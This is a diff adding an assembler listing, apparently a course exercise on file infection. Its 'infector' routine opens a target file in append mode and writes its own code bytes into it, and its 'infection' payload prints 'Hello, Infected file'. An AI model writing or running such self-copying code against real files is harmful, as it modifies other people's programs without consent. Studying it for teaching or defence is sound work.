@@ -1,0 +1,96 @@
+     1                                  section .data
+     2 00000000 48656C6C6F2C20496E-         msg: db 'Hello, Infected file', 10, 0
+     2 00000009 666563746564206669-
+     2 00000012 6C650A00           
+     3                                  
+     4                                  section .bss			; we define (global) uninitialized variables in .bss section
+     5 00000000 <res 00000064>          	str: resb 100		; For the name of the file in infector.
+     6                                  
+     7                                  section .text
+     8                                      global _start
+     9                                      global system_call
+    10                                      extern main
+    11                                      global code_start
+    12                                  
+    13                                  _start:
+    14 00000000 59                          pop    dword ecx    ; ecx = argc
+    15 00000001 89E6                        mov    esi,esp      ; esi = argv
+    16                                      ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
+    17 00000003 89C8                        mov     eax,ecx     ; put the number of arguments into eax
+    18 00000005 C1E002                      shl     eax,2       ; compute the size of argv in bytes
+    19 00000008 01F0                        add     eax,esi     ; add the size to the address of argv 
+    20 0000000A 83C004                      add     eax,4       ; skip NULL at the end of argv
+    21 0000000D 50                          push    dword eax   ; char *envp[]
+    22 0000000E 56                          push    dword esi   ; char* argv[]
+    23 0000000F 51                          push    dword ecx   ; int argc
+    24                                  
+    25 00000010 E8(00000000)                call    main        ; int main( int argc, char *argv[], char *envp[] )
+    26                                  
+    27 00000015 89C3                        mov     ebx,eax
+    28 00000017 B801000000                  mov     eax,1
+    29 0000001C CD80                        int     0x80
+    30 0000001E 90                          nop
+    31                                          
+    32                                  system_call:
+    33 0000001F 55                          push    ebp             ; Save caller state
+    34 00000020 89E5                        mov     ebp, esp
+    35 00000022 83EC04                      sub     esp, 4          ; Leave space for local var on stack
+    36 00000025 60                          pushad                  ; Save some more caller state
+    37                                  
+    38 00000026 8B4508                      mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
+    39 00000029 8B5D0C                      mov     ebx, [ebp+12]   ; Next argument...
+    40 0000002C 8B4D10                      mov     ecx, [ebp+16]   ; Next argument...
+    41 0000002F 8B5514                      mov     edx, [ebp+20]   ; Next argument...
+    42 00000032 CD80                        int     0x80            ; Transfer control to operating system
+    43 00000034 8945FC                      mov     [ebp-4], eax    ; Save returned value...
+    44 00000037 61                          popad                   ; Restore caller state (registers)
+    45 00000038 8B45FC                      mov     eax, [ebp-4]    ; place returned value where caller can see it
+    46 0000003B 83C404                      add     esp, 4          ; Restore caller state
+    47 0000003E 5D                          pop     ebp             ; Restore caller state
+    48 0000003F C3                          ret                     ; Back to caller
+    49                                  
+    50                                  
+    51                                  
+    52                                  code_start:
+    53                                  
+    54                                  infection:
+    55 00000040 55                          push    ebp             ; Save caller state
+    56 00000041 89E5                        mov     ebp, esp
+    57 00000043 60                          pushad                  ; Save some more caller state
+    58                                  
+    59 00000044 B804000000                  mov     eax, 4          ; Copy function args to registers: leftmost...        
+    60 00000049 BB01000000                  mov     ebx, 1          ; Next argument...
+    61 0000004E B9[00000000]                mov     ecx, msg        ; Next argument...
+    62 00000053 BA16000000                  mov     edx, 22         ; Next argument...
+    63 00000058 CD80                        int     0x80            ; Transfer control to operating system
+    64 0000005A 61                          popad                   ; Restore caller state (registers)
+    65 0000005B 8B45FC                      mov     eax, [ebp-4]    ; place returned value where caller can see it
+    66 0000005E 83C404                      add     esp, 4          ; Restore caller state
+    67 00000061 5D                          pop     ebp             ; Restore caller state
+    68 00000062 C3                          ret                     ; Back to caller
+    69                                  
+    70                                  infector:
+    71 00000063 55                          push    ebp             ; Save caller state
+    72 00000064 89E5                        mov     ebp, esp
+    73 00000066 60                          pushad                  ; Save some more caller state
+    74                                  
+    75 00000067 B805000000                  mov     eax, 5          ; Copy function args to registers: leftmost...        
+    76 0000006C 89CB                        mov     ebx, ecx        ; Next argument...
+    77 0000006E B900040000                  mov     ecx, 1024       ; Next argument...
+    78 00000073 BA09030000                  mov     edx, 0777       ; Next argument...
+    79 00000078 CD80                        int     0x80            ; Transfer control to operating system
+    80                                  
+    81 0000007A 89C6                        mov esi, eax            ; Save file descriptor.
+    82                                  
+    83 0000007C 89C3                        mov     ebx, eax        ; Next argument...
+    84 0000007E B804000000                  mov     eax, 4          ; Copy function args to registers: leftmost...        
+    85 00000083 B9[40000000]                mov     ecx, code_start ; Next argument...
+    86 00000088 BA4B000000                  mov     edx, 0x8B - 0x40       ; Next argument...
+    87 0000008D CD80                        int     0x80            ; Transfer control to operating system
+    88                                  
+    89 0000008F B806000000                  mov     eax, 6          ; Copy function args to registers: leftmost...        
+    90 00000094 89F3                        mov     ebx, esi        ; Next argument...
+    91 00000096 CD80                        int     0x80            ; Transfer control to operating system
+    92                                  
+    93                                  code_end:
+    94                                      
